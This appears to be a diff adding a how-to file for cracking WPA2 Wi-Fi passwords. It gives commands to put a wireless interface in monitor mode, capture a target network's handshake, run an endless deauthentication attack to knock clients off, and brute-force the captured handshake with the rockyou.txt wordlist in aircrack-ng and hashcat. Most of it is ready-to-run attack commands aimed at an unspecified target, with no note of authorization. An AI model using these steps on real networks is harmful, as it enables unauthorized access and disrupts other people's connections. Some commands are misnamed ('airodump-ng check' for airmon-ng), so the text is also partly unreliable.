@@ -1,0 +1,66 @@
+###WPA2 Cracking with Airo Dump###
+
+NEEDED:
+-Airodump
+-Aireplay
+-Aircrack
+-Hashcat 
+-Rockyou.txt
+
+
+#First discover your wireless interface:
+    $ ifconfig
+    *mine will be wlp2s0
+
+#Check for processes that can cause trouble during the handshake
+    $ airodump-ng check wlp2s0
+
+#Kill the processes (choose one of the two methods)
+   1 - $ kill [PID]
+   2 - $ airodump-ng check kill wlp2s0
+
+#Check if there are any processes by repeating:
+    $ airodump-ng check wlp2s0
+
+#Set wireless network to monitor mode
+    $ ifconfig wlp2s0 down
+    $ iwconfig wlp2s0 mode monitor
+    $ ifconfig wlp2s0 up
+
+#Check if it changed to Mon Mode
+    $ iwconfig 
+
+#Get handshake with Airo Dump
+    $ airodump-ng wlp2s0
+    CTRL-C
+    $ airodump-ng -c [CH Number] --bssid [TargetMac] -w [FileName] wlp2s0
+
+    --OPEN ANOTHER TERMINAL TO DEAUTH ATTACK--
+    $aireplay-ng -0 0 -a [TargetMac] wlp2s0
+    *Zero means to deauthenticate forever (until we close the program) 
+    
+    CTRL-C the aireplay-ng Terminal
+    CTRL-C the airodump-ng Terminal
+    *This will stop the attack and write the data to files in the Dir you've created.
+
+>There will be 4 files
+>Keep the .cap file, delete the others as you wish    
+>Transfer the files wherever you want
+
+>Open the .cap file with wireshark or any .cap reader
+    $ apt-get install wireshark (if not installed)
+>Filter the "eapol" packages by typing it in the wireshark filter bar 
+>This is for inspecting the packages inside the .cap file
+
+###Now Crack The Password With Aircrack Bruteforce###
+>Download rockyou.txt
+>Put in the desired Dir
+>Convert your .cap file into a .hccapx file in hashcat.net site.
+>Go to the dir where you put the .cap file 
+    $aircrack-ng -w [rockyou.txt dir] [filename.cap]
+>This would take a long time. So lets use Hashcat!
+
+>Go to the converted .hccapx dir
+    $ hashcat -a 0 -m 2500 [filename.hccapx] [rockyou.txt DIR]
+
+
